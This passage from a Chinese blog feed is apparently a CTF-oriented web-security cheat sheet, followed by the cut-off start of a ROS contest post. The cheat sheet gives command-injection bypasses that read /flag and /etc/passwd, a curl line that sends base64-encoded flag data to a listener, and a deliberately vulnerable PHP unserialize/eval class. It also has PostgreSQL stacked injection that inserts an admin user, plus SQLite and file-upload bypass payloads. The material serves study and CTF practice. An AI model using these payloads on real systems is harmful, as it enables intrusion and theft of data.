<span class="n">cat</span> <span class="n">y1</span> <span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="n">g</span><span class="mf">.</span><span class="n">php</span>

<span class="c1">// 6. 用 * 匹配任意</span>
<span class="n">cat</span> <span class="n">y1n</span><span class="o">*</span>
<span class="mf">7.</span><span class="n">cat</span> <span class="n">y1n</span><span class="o">?</span>
<span class="mf">8.</span><span class="n">cat</span> <span class="n">y1</span><span class="p">{</span><span class="n">a</span><span class="mf">..</span><span class="n">z</span><span class="p">}</span><span class="n">g</span>
<span class="mf">9.</span><span class="n">内联执行</span><span class="err">：</span><span class="n">如</span><span class="err">，</span><span class="n">ls</span> <span class="n">输出为flag</span> <span class="n">则执行cat</span> <span class="sb">`ls`</span>
<span class="mf">10.</span><span class="n">shell特殊变量绕过</span><span class="o">:</span><span class="n">ca</span><span class="err">$</span><span class="o">@</span><span class="n">t</span> <span class="n">fla</span><span class="err">$</span><span class="o">@</span><span class="n">g或者ca</span><span class="err">$</span><span class="mi">1</span><span class="n">t</span> <span class="n">fla</span><span class="err">$</span><span class="mi">2</span><span class="n">g</span>
</code></pre></div></div> <h4 id="命令替代">命令替代</h4> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cat</span><span class="err">、</span><span class="n">tac</span><span class="err">、</span><span class="n">more</span><span class="err">、</span><span class="n">less</span><span class="err">、</span><span class="n">head</span><span class="err">、</span><span class="n">tail</span><span class="err">、</span><span class="n">nl</span><span class="err">、</span><span class="n">sed</span><span class="err">、</span><span class="n">sort</span><span class="err">、</span><span class="n">uniq</span>

<span class="n">more</span><span class="o">:</span><span class="n">一页一页的显示档案内容</span>
<span class="n">less</span><span class="o">:</span><span class="n">与</span> <span class="n">more</span> <span class="n">类似</span>
<span class="n">head</span><span class="o">:</span><span class="n">查看头几行</span>
<span class="n">tac</span><span class="o">:</span><span class="n">从最后一行开始显示</span><span class="err">，</span><span class="n">可以看出</span> <span class="n">tac</span> <span class="n">是</span> <span class="n">cat</span> <span class="n">的反向显示</span>
<span class="n">tail</span><span class="o">:</span><span class="n">查看尾几行</span>
<span class="n">nl</span><span class="err">：</span><span class="n">显示的时候</span><span class="err">，</span><span class="n">顺便输出行号</span>
<span class="n">od</span><span class="o">:</span><span class="n">以二进制的方式读取档案内容</span>
<span class="n">vi</span><span class="o">:</span><span class="n">一种编辑器</span><span class="err">，</span><span class="n">这个也可以查看</span>
<span class="n">vim</span><span class="o">:</span><span class="n">一种编辑器</span><span class="err">，</span><span class="n">这个也可以查看</span>
<span class="n">sort</span><span class="o">:</span><span class="n">可以查看</span>
<span class="n">uniq</span><span class="o">:</span><span class="n">可以查看</span>
<span class="n">file</span> <span class="o">-</span><span class="n">f</span><span class="o">:</span><span class="n">报错出具体内容</span>
</code></pre></div></div> <p><strong>其他读取命令：</strong></p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nl</span><span class="err">：</span><span class="n">nl</span> <span class="o">/</span><span class="n">flag</span>
<span class="n">pr</span><span class="err">：</span><span class="n">pr</span> <span class="o">/</span><span class="n">flag</span>
<span class="n">od</span><span class="err">：</span><span class="n">od</span> <span class="o">-</span><span class="n">t</span> <span class="n">c</span> <span class="o">/</span><span class="n">flag</span>
<span class="n">rev</span><span class="err">：</span><span class="n">rev</span> <span class="o">/</span><span class="n">flag</span>
<span class="n">fmt</span><span class="err">：</span><span class="n">fmt</span> <span class="o">/</span><span class="n">flag</span>
<span class="n">php</span><span class="err">：</span><span class="n">php</span> <span class="o">/</span><span class="n">flag</span>
<span class="n">cut</span><span class="err">：</span><span class="n">cut</span> <span class="o">-</span><span class="n">b1</span><span class="o">-</span> <span class="o">/</span><span class="n">flag</span><span class="err">、</span><span class="n">cut</span> <span class="o">-</span><span class="n">c1</span><span class="o">-</span> <span class="o">/</span><span class="n">flag</span><span class="err">、</span><span class="n">cut</span> <span class="o">-</span><span class="n">f1</span> <span class="o">/</span><span class="n">flag</span>
<span class="n">sort</span><span class="err">：</span><span class="n">sort</span> <span class="o">/</span><span class="n">flag</span>
<span class="n">uniq</span><span class="err">：</span><span class="n">uniq</span> <span class="o">/</span><span class="n">flag</span>
<span class="n">grep</span><span class="err">：</span><span class="n">grep</span> <span class="p">{</span> <span class="o">/</span><span class="n">flag</span>
<span class="n">curl</span><span class="err">：</span><span class="n">curl</span> <span class="n">file</span><span class="o">:///</span><span class="n">flag</span>
<span class="n">diff</span><span class="err">：</span><span class="n">diff</span> <span class="o">/</span><span class="n">flag</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
<span class="n">iconv</span><span class="err">：</span><span class="n">iconv</span> <span class="o">/</span><span class="n">flag</span>
<span class="n">paste</span><span class="err">：</span><span class="n">paste</span> <span class="o">/</span><span class="n">flag</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
<span class="n">strings</span><span class="err">：</span><span class="n">strings</span> <span class="o">/</span><span class="n">flag</span>
<span class="n">base32</span><span class="err">、</span><span class="n">base64</span>
<span class="n">bzmore</span><span class="err">、</span><span class="n">bzless</span><span class="err">：</span><span class="n">bzmore</span> <span class="o">/</span><span class="n">flag</span><span class="err">、</span><span class="n">bzless</span> <span class="o">/</span><span class="n">flag</span>
</code></pre></div></div> <h4 id="escapeshellargescapeshellcmd">escapeshellarg()+escapeshellcmd()</h4> <p>同时使用会有安全隐患</p> <h4 id="无回显-rce">无回显 RCE</h4> <ol> <li><strong>curl 外带</strong></li> </ol> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">curl</span> <span class="mf">127.0.0.1</span><span class="o">:</span><span class="mi">1234</span><span class="o">/?</span><span class="n">flag</span><span class="o">=</span><span class="sb">`cat flag|base64`</span>
</code></pre></div></div> <ol> <li><strong>dnslog</strong></li> </ol> <p>使用 dnslog 平台查看回显</p> <h4 id="神奇-payload">神奇 payload</h4> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/???/??? *
可以是/bin/cat flag.php,所以可以读取到flag
</code></pre></div></div> <h4 id="bash-盲注">bash 盲注</h4> <p><strong>当机器无回显且不出网的情况下</strong></p> <p>即为延时盲注，注意截取与比较</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mf">1.</span><span class="n">grep</span> <span class="o">-</span><span class="n">e</span> <span class="s2">"^BJ"</span><span class="n">flag</span> <span class="o">&amp;&amp;</span><span class="n">sleep</span> <span class="mi">5</span>
<span class="mf">2.</span><span class="n">cut</span>
<span class="mf">3.</span><span class="n">url</span><span class="o">=</span><span class="s2">"http://www.baidu.com"</span>
    <span class="k">echo</span> <span class="err">$</span><span class="p">{</span><span class="n">url</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="mi">11</span><span class="p">}</span>
</code></pre></div></div> <hr/> <h2 id="三php-反序列化漏洞">三、PHP 反序列化漏洞</h2> <h3 id="什么是反序列化">什么是反序列化</h3> <p>PHP 的所谓的序列化也是一个将各种类型的数据，压缩并按照一定格式存储的过程，使用的函数是 serialize()</p> <p><strong>php 反序列化漏洞又称对象注入，可能会导致远程代码执行(RCE)</strong></p> <p>可以理解漏洞为执行 unserialize 函数，调用某一类并执行魔术方法(magic method)，之后可以执行类中函数，产生安全问题。</p> <h3 id="漏洞前提">漏洞前提</h3> <ol> <li>unserialize() 函数的变量可控</li> <li>php 文件中存在可利用的类，类中有魔术方法</li> </ol> <h3 id="示例">示例</h3> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="kd">class</span> <span class="nc">DEMO1</span>
<span class="p">{</span>
  <span class="k">public</span> <span class="nv">$func</span> <span class="o">=</span> <span class="s1">'safe'</span><span class="p">;</span>
  <span class="k">public</span> <span class="nv">$arg</span> <span class="o">=</span> <span class="s1">'abcd'</span><span class="p">;</span>
  <span class="k">public</span> <span class="k">function</span> <span class="n">safe</span><span class="p">()</span>
  <span class="p">{</span>
    <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">arg</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">public</span> <span class="k">function</span> <span class="n">evil</span><span class="p">()</span>
  <span class="p">{</span>
    <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">arg</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">public</span> <span class="k">function</span> <span class="n">run</span><span class="p">()</span>
  <span class="p">{</span>
    <span class="nv">$this</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">}();</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$obj</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'a'</span><span class="p">]);</span>
<span class="nv">$obj</span><span class="o">-&gt;</span><span class="nf">run</span><span class="p">();</span>
</code></pre></div></div> <h3 id="魔术方法">魔术方法</h3> <p>PHP 类中有一种特殊函数体的存在叫魔术方法，它的命名是以两个下划线符号 <code class="language-plaintext highlighter-rouge">__</code> 开头的，这些函数在某些情况下会自动调用而在反序列化时，如果反序列化对象中存在魔法函数，使用 unserialize() 函数同时也会触发。</p> <p><strong>常见魔术方法：</strong></p> <ul> <li><code class="language-plaintext highlighter-rouge">__construct()</code> - 构造函数</li> <li><code class="language-plaintext highlighter-rouge">__destruct()</code> - 析构函数</li> <li><code class="language-plaintext highlighter-rouge">__wakeup()</code> - 反序列化时调用</li> <li><code class="language-plaintext highlighter-rouge">__sleep()</code> - 序列化时调用</li> <li><code class="language-plaintext highlighter-rouge">__toString()</code> - 对象被当作字符串时调用</li> <li><code class="language-plaintext highlighter-rouge">__call()</code> - 调用不存在的方法时调用</li> <li><code class="language-plaintext highlighter-rouge">__get()</code> - 读取不可访问属性时调用</li> <li><code class="language-plaintext highlighter-rouge">__set()</code> - 写入不可访问属性时调用</li> </ul> <h3 id="session-反序列化">Session 反序列化</h3> <p>除了默认的 session 序列化引擎 php 外，还有几种引擎，不同引擎存储方式不同</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span> <span class="n">php_binary</span> <span class="n">键名的长度对应的ASCII字符</span><span class="err">＋</span><span class="n">键名</span><span class="err">＋</span><span class="nf">经过serialize</span><span class="p">()</span> <span class="n">函数序列化处理的值</span>
<span class="o">-</span> <span class="n">php</span> <span class="n">键名</span><span class="err">＋</span><span class="n">竖线</span><span class="err">＋</span><span class="nf">经过serialize</span><span class="p">()</span><span class="n">函数序列处理的值</span>
<span class="o">-</span> <span class="n">php_serialize</span> <span class="nb">serialize</span><span class="p">()</span><span class="n">函数序列处理数组方式</span>
</code></pre></div></div> <p>三种处理器的存储格式差异，就会造成在 session 序列化和反序列化处理器设置不当时的安全隐患。</p> <hr/> <h2 id="四其他数据库注入">四、其他数据库注入</h2> <h3 id="postgresql-注入">PostgreSQL 注入</h3> <h4 id="判断">判断</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">--可以注释，#不可注释，则不是mysql</span>
<span class="err">利用</span><span class="n">exp</span><span class="p">(</span><span class="mi">999999</span><span class="p">)</span><span class="err">构造报错，可判断是</span><span class="n">PostgreSQL</span>
<span class="err">或者测试延时盲注</span> <span class="err">利用</span><span class="n">pg_sleep</span><span class="p">()</span>
</code></pre></div></div> <h4 id="like-注入">LIKE 注入</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">LIKE</span> <span class="err">子句中，通常与通配符结合使用，通配符表示任意字符</span>
<span class="err">•</span> <span class="err">百分号</span> <span class="o">%</span> <span class="err">相当于</span> <span class="o">*</span>
<span class="err">•</span> <span class="err">下划线</span> <span class="n">_</span> <span class="err">相当于</span> <span class="o">?</span>
<span class="k">ESCAPE</span><span class="err">用于指定转义符：</span>
  <span class="k">select</span> <span class="s1">'abc%cff'</span> <span class="k">like</span> <span class="s1">'abc-%cf'</span> <span class="k">escape</span> <span class="s1">'-'</span><span class="p">;</span>
  <span class="o">#</span><span class="err">将</span><span class="o">-</span><span class="err">指定为转义符即可继续匹配</span>
</code></pre></div></div> <h4 id="group_concat-替代">group_concat 替代</h4> <p>PostgreSQL 中并没有 group_concat() 这个函数</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">聚合函数</span> <span class="n">array_agg</span><span class="p">()</span>  <span class="n">string_agg</span><span class="p">()</span>
  <span class="err">常常与</span><span class="n">array_to_string</span><span class="p">()</span><span class="err">搭配作用相当于</span><span class="k">join</span>
  <span class="n">string_agg</span><span class="p">(</span><span class="n">expression</span><span class="p">,</span> <span class="k">delimiter</span><span class="p">)</span> <span class="err">直接把一个表达式变成字符串</span>
</code></pre></div></div> <h4 id="延时">延时</h4> <p>pg_sleep(5)</p> <p>方式：</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="p">.</span><span class="k">select</span> <span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">case</span> <span class="k">when</span> <span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="k">then</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span> <span class="k">from</span> <span class="n">pg_sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span> <span class="k">else</span> <span class="mi">0</span> <span class="k">end</span><span class="p">);</span>
<span class="mi">2</span><span class="p">.</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">and</span> <span class="s1">'a'</span><span class="o">=</span><span class="p">(</span><span class="k">case</span> <span class="k">when</span> <span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="k">then</span> <span class="n">pg_sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)::</span><span class="nb">VARCHAR</span> <span class="k">else</span> <span class="s1">'a'</span> <span class="k">end</span><span class="p">)</span>
<span class="mi">3</span><span class="p">.</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">and</span> <span class="s1">'a'</span><span class="o">=</span><span class="p">(</span><span class="k">case</span> <span class="k">when</span> <span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="k">then</span> <span class="n">pg_sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span><span class="o">||</span><span class="s1">'b'</span> <span class="k">else</span> <span class="s1">'a'</span> <span class="k">end</span><span class="p">)</span>
  <span class="o">#</span><span class="err">在该数据库中</span><span class="o">||</span><span class="err">代表字符串拼接</span>
</code></pre></div></div> <h4 id="堆叠注入">堆叠注入</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">create</span> <span class="k">function</span> <span class="n">ddkkk</span><span class="p">(</span><span class="n">bd</span> <span class="nb">text</span><span class="p">)</span> <span class="k">returns</span> <span class="nb">integer</span> <span class="k">as</span><span class="err">$$</span> <span class="k">BEGIN</span> <span class="k">execute</span> <span class="n">bd</span><span class="p">;</span>
<span class="k">return</span> <span class="mi">1</span><span class="p">;</span> <span class="k">END</span><span class="p">;</span> <span class="err">$$</span> <span class="k">language</span> <span class="n">plpgsql</span><span class="p">;</span>
<span class="k">select</span> <span class="n">ddkkk</span><span class="p">(</span><span class="s1">'i'</span><span class="o">||</span><span class="s1">'n'</span><span class="o">||</span><span class="s1">'s'</span><span class="o">||</span><span class="s1">'e'</span><span class="o">||</span><span class="s1">'r'</span><span class="o">||</span><span class="s1">'t'</span><span class="o">||</span><span class="s1">' '</span><span class="o">||</span><span class="s1">'i'</span><span class="o">||</span><span class="s1">'n'</span><span class="o">||</span><span class="s1">'t'</span><span class="o">||</span><span class="s1">'o'</span><span class="o">||</span><span class="s1">''</span><span class="o">||</span><span class="s1">'users(username, p'</span><span class="o">||</span><span class="s1">'a'</span><span class="o">||</span><span class="s1">'s'</span><span class="o">||</span><span class="s1">'sword)'</span><span class="o">||</span><span class="s1">' values(</span><span class="se">''</span><span class="s1">admin</span><span class="se">''</span><span class="s1">,</span><span class="se">''</span><span class="s1">adddd</span><span class="se">''</span><span class="s1">);'</span><span class="p">);</span>
<span class="k">COMMIT</span><span class="p">;</span> <span class="k">select</span> <span class="s1">'asdfasdf'</span><span class="p">::</span><span class="nb">integer</span><span class="p">;</span> <span class="c1">--</span>
</code></pre></div></div> <h3 id="sqlite-注入">SQLite 注入</h3> <h4 id="注释符">注释符</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/**/</span>
<span class="c1">--</span>
<span class="err">可用</span><span class="o">#</span><span class="err">判断，如果</span><span class="o">#</span><span class="err">不管用则不是</span><span class="n">mysql</span>
</code></pre></div></div> <h4 id="查询表名">查询表名</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">tbl_name</span> <span class="k">FROM</span> <span class="n">sqlite_master</span> <span class="k">WHERE</span> <span class="k">type</span><span class="o">=</span><span class="s1">'table'</span> <span class="k">and</span> <span class="n">tbl_name</span> <span class="k">NOT</span> <span class="k">like</span> <span class="s1">'sqlite_%'</span>
<span class="o">#</span><span class="err">过滤</span><span class="n">sqlite</span><span class="err">开头的系统表名</span>
</code></pre></div></div> <h4 id="查询列名">查询列名</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="k">sql</span> <span class="k">FROM</span> <span class="n">sqlite_master</span> <span class="k">WHERE</span> <span class="k">type</span><span class="o">!=</span><span class="s1">'meta'</span> <span class="k">AND</span> <span class="k">sql</span> <span class="k">NOT</span> <span class="k">NULL</span> <span class="k">AND</span> <span class="n">name</span> <span class="o">=</span><span class="s1">'table_name'</span>
</code></pre></div></div> <h4 id="字符串截取">字符串截取</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">substr</span><span class="p">()</span> <span class="k">substring</span><span class="p">()</span> <span class="k">like</span> <span class="o">=</span> <span class="o">&gt;</span> <span class="o">&lt;</span> <span class="k">in</span> <span class="k">between</span> <span class="err">于</span><span class="n">mysql</span><span class="err">差不多</span>
 <span class="err">特有的：</span> <span class="k">trim</span><span class="err">、</span><span class="n">ltrim</span><span class="err">、</span><span class="n">rtrim</span><span class="err">、</span><span class="n">printf</span>
 <span class="k">trim</span> <span class="err">：</span><span class="k">TRIM</span> <span class="p">(</span><span class="err">字符串</span><span class="p">,</span><span class="err">要移除的字符</span><span class="p">)</span> <span class="err">如果要移除的字符不写，默认是空格</span>
 <span class="n">printf</span> <span class="err">：</span>
  <span class="k">select</span> <span class="n">printf</span><span class="p">(</span><span class="s1">'%.1s'</span><span class="p">,</span><span class="s1">'abc'</span><span class="p">)</span> <span class="o">=</span> <span class="n">a</span>
  <span class="err">如果</span><span class="n">printf</span><span class="p">(</span><span class="s1">'%.is'</span><span class="p">,</span> <span class="s1">'abc'</span><span class="p">)</span><span class="o">=</span><span class="n">printf</span><span class="p">(</span><span class="s1">'%.i+1s'</span><span class="p">,</span> <span class="s1">'abc'</span><span class="p">)</span> <span class="err">则说明字符串长度为</span><span class="n">i</span>
</code></pre></div></div> <h4 id="字符串比较">字符串比较</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="p">.</span><span class="err">与</span><span class="n">mysql</span><span class="err">同部分略</span>
<span class="mi">2</span><span class="p">.</span><span class="n">GLOB</span> <span class="err">运算符相当于等于，且其遵循</span><span class="n">unix</span><span class="err">语法</span>
</code></pre></div></div> <h4 id="条件">条件</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">1</span><span class="p">.</span><span class="k">case</span> <span class="k">when</span> <span class="n">X</span> <span class="k">then</span> <span class="n">Y</span> <span class="k">else</span> <span class="n">Z</span> <span class="k">end</span> <span class="err">这个语句和</span><span class="n">mysql</span><span class="err">是相同的</span>
<span class="mi">2</span><span class="p">.</span><span class="err">还可以写作</span> <span class="n">iif</span><span class="p">(</span><span class="n">X</span><span class="p">,</span><span class="n">Y</span><span class="p">,</span><span class="n">Z</span><span class="p">)</span>

<span class="err">注意</span><span class="p">:</span>
<span class="n">sqlite</span><span class="err">中没有</span><span class="n">if</span><span class="err">语句</span>
<span class="n">iif</span><span class="err">只有</span><span class="k">version</span><span class="o">&gt;=</span><span class="mi">3</span><span class="p">.</span><span class="mi">32</span><span class="err">可用</span>
</code></pre></div></div> <h4 id="构造报错">构造报错</h4> <p>mysql 中可以使用 exp(999999) cot(0) 等等。</p> <p>sqlite 中使用 randomblob(N) 返回 N-byte blob</p> <h4 id="时间盲注">时间盲注</h4> <p>sqlite 中并没有 sleep() 这样的延时函数</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="mi">123</span><span class="o">=</span><span class="k">LIKE</span><span class="p">(</span><span class="s1">'ABCDEFG'</span><span class="p">,</span><span class="k">UPPER</span><span class="p">(</span><span class="n">HEX</span><span class="p">(</span><span class="n">RANDOMBLOB</span><span class="p">([</span><span class="err">秒</span><span class="p">]</span><span class="mi">00000000</span><span class="o">/</span><span class="mi">2</span><span class="p">))))</span>
</code></pre></div></div> <hr/> <h2 id="五php-文件上传漏洞">五、PHP 文件上传漏洞</h2> <h3 id="前端验证的绕过">前端验证的绕过</h3> <p>禁用 js 或者用 burp 抓包改包</p> <h3 id="mime-type-绕过">MIME-TYPE 绕过</h3> <p>burp 修改 content-type</p> <h3 id="黑名单后缀绕过">黑名单后缀绕过</h3> <p>可以考虑大小写绕过，php2 php3 php4 类推以及 phtml 等</p> <p>双写绕过</p> <p><strong>反斜线拆分绕过：</strong></p> <p>当文件名被过滤时，可以使用反斜线拆分绕过。</p> <h3 id="文件内容的绕过">文件内容的绕过</h3> <p>文件内容绕过主要包括：</p> <ol> <li><strong>文件头绕过</strong> - 在文件开头添加图片文件头（如 GIF89a）来绕过内容检测</li> <li><strong>短标签绕过</strong> - 使用 <code class="language-plaintext highlighter-rouge">&lt;?=</code> 代替 <code class="language-plaintext highlighter-rouge">&lt;?php</code></li> <li><strong>注释绕过</strong> - 在 PHP 代码中添加注释来分割关键字</li> <li><strong>字符串拼接绕过</strong> - 使用字符串拼接来绕过关键字检测</li> <li><strong>编码绕过</strong> - 使用 base64、rot13 等编码方式</li> </ol> <hr/> <h2 id="六数据库基础">六、数据库基础</h2> <h3 id="数据库简介">数据库简介</h3> <p>数据库，又称为数据管理系统，简而言之可视为电子化的文件柜——存储电子文件的处所，用户可以对文件中的数据运行新增、截取、更新、删除等操作。</p> <p>所谓”数据库”系以一定方式储存在一起、能予多个用户共享、具有尽可能小的冗余度、与应用程序彼此独立的数据集合。一个数据库由多个表空间（Tablespace）构成。</p> <h3 id="常见数据库">常见数据库</h3> <ul> <li>MYSQL</li> <li>SQL SERVER</li> <li>Oracle</li> <li>Postgres</li> <li>SQLite</li> </ul> <h3 id="sql-语法基础">SQL 语法基础</h3> <p>注：SQL 语法对于大小写不敏感</p> <h4 id="查看创建的数据库">查看创建的数据库</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SHOW</span> <span class="n">DATABASES</span><span class="p">;</span>
</code></pre></div></div> <h4 id="创建并切换数据库">创建并切换数据库</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CREATE</span> <span class="k">DATABASE</span> <span class="n">test</span><span class="p">;</span>
<span class="n">USE</span> <span class="n">test</span><span class="p">;</span>
</code></pre></div></div> <h4 id="查看数据库里所有表">查看数据库里所有表</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SHOW</span> <span class="n">TABLES</span><span class="p">;</span>
</code></pre></div></div> <h4 id="创建表并查看表结构">创建表并查看表结构</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">testtable</span> <span class="p">(</span>
    <span class="n">id</span> <span class="nb">int</span><span class="p">(</span><span class="mi">11</span><span class="p">)</span> <span class="n">auto_increment</span> <span class="k">primary</span> <span class="k">key</span><span class="p">,</span>
    <span class="n">name</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
<span class="p">);</span><span class="o">#</span> <span class="err">创建一个两列的表</span><span class="n">testtable</span><span class="err">，</span><span class="n">id</span> <span class="err">和</span> <span class="n">name</span><span class="err">，</span><span class="n">id</span> <span class="err">自动生成</span>

<span class="k">DESC</span> <span class="n">testtable</span><span class="p">;</span> <span class="o">#</span> <span class="err">展示</span> <span class="n">testtable</span> <span class="err">的表结构</span>
</code></pre></div></div> <h4 id="添加数据">添加数据</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">testtable</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="k">VALUES</span><span class="p">(</span><span class="s1">'DASCTF'</span><span class="p">);</span>
<span class="o">#</span> <span class="err">往</span> <span class="n">testtable</span> <span class="err">表中插入一个数据，</span><span class="n">id</span> <span class="err">自动生成，</span><span class="n">name</span> <span class="err">为</span> <span class="n">DASCTF</span>
</code></pre></div></div> <h4 id="查询数据">查询数据</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">testtable</span><span class="p">;</span> <span class="o">#</span><span class="err">直接查询</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">testtable</span> <span class="k">WHERE</span> <span class="n">name</span><span class="o">=</span><span class="s1">'a'</span><span class="p">;</span> <span class="o">#</span> <span class="err">查询</span> <span class="n">name</span> <span class="err">为</span> <span class="n">a</span> <span class="err">的数据</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">testtable</span> <span class="k">WHERE</span> <span class="n">name</span><span class="o">=</span><span class="s1">'DASCTF'</span><span class="p">;</span> <span class="o">#</span> <span class="err">查询</span> <span class="n">name</span> <span class="err">为</span> <span class="n">DASCTF</span><span class="err">的数据</span>
</code></pre></div></div> <h4 id="修改数据">修改数据</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">UPDATE</span> <span class="n">testtable</span> <span class="k">SET</span> <span class="n">name</span><span class="o">=</span><span class="s1">'DASCTF777'</span><span class="p">;</span>
<span class="o">#</span> <span class="err">将表内数据</span> <span class="n">name</span> <span class="err">列内容改为</span> <span class="n">DASCTF777</span>
</code></pre></div></div> <h4 id="删除数据">删除数据</h4> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">DELETE</span> <span class="k">FROM</span> <span class="n">testtable</span> <span class="k">WHERE</span> <span class="n">name</span><span class="o">=</span><span class="s1">'DASCTF777'</span><span class="p">;</span>
<span class="o">#</span> <span class="err">删除表中</span> <span class="n">name</span> <span class="err">为</span> <span class="n">DASCTF777</span> <span class="err">的数据</span>
</code></pre></div></div> <hr/> <h2 id="总结">总结</h2> <p>Web 安全漏洞种类繁多，本文总结了常见的几种类型：</p> <ol> <li><strong>文件包含漏洞</strong> - 通过包含恶意文件执行代码</li> <li><strong>命令注入</strong> - 通过注入系统命令执行任意代码</li> <li><strong>反序列化漏洞</strong> - 通过反序列化恶意对象执行代码</li> <li><strong>其他数据库注入</strong> - PostgreSQL、SQLite 等数据库的注入方法</li> </ol> <p>在实际开发中，应该：</p> <ul> <li>对用户输入进行严格验证和过滤</li> <li>使用参数化查询防止 SQL 注入</li> <li>避免直接执行系统命令</li> <li>谨慎处理序列化数据</li> <li>定期进行安全审计和渗透测试</li> </ul>]]></content><author><name></name></author><category term="Web安全"/><category term="Web安全"/><category term="文件操作"/><category term="命令注入"/><category term="反序列化"/><category term="SQL注入"/><summary type="html"><![CDATA[Web 安全常见漏洞总结，包括文件包含、命令注入、反序列化、其他数据库注入等]]></summary></entry><entry><title type="html">深大ROS俱乐部内部赛</title><link href="https://gewenhao.win/blog/2023/%E6%B7%B1%E5%A4%A7ROS%E4%BF%B1%E4%B9%90%E9%83%A8%E5%86%85%E9%83%A8%E8%B5%9B/" rel="alternate" type="text/html" title="深大ROS俱乐部内部赛"/><published>2023-08-01T10:00:00+00:00</published><updated>2023-08-01T10:00:00+00:00</updated><id>https://gewenhao.win/blog/2023/%E6%B7%B1%E5%A4%A7ROS%E4%BF%B1%E4%B9%90%E9%83%A8%E5%86%85%E9%83%A8%E8%B5%9B</id><content type="html" xml:base="https://gewenhao.win/blog/2023/%E6%B7%B1%E5%A4%A7ROS%E4%BF%B1%E4%B9%90%E9%83%A8%E5%86%85%E9%83%A8%E8%B5%9B/"><![CDATA[<h1 id="深大ros俱乐部内部赛">深大ROS俱乐部内部赛</h1> <p><strong>深大ROS俱乐部内部赛</strong></p> <p><strong>一、第一部分，ROS 基础（20 分）</strong></p> <p>完成 ROS 基础概念的编程实验，要求使用 C++或 python。</p> <p>（一）完成 3 个关于 ROS 基础概念的编程实验。要求：展示代码与运行测试过程，并提供相关文档说明实现流程、运行步骤说明。</p> <p>（<strong>1）实验 1</strong>：使用 ROS 话题(Topic)机制实现消息发布与订阅</p> <p>要求：编写代码实现 ROS 中消息的发布与订阅：创建一个发布者，每隔 100ms 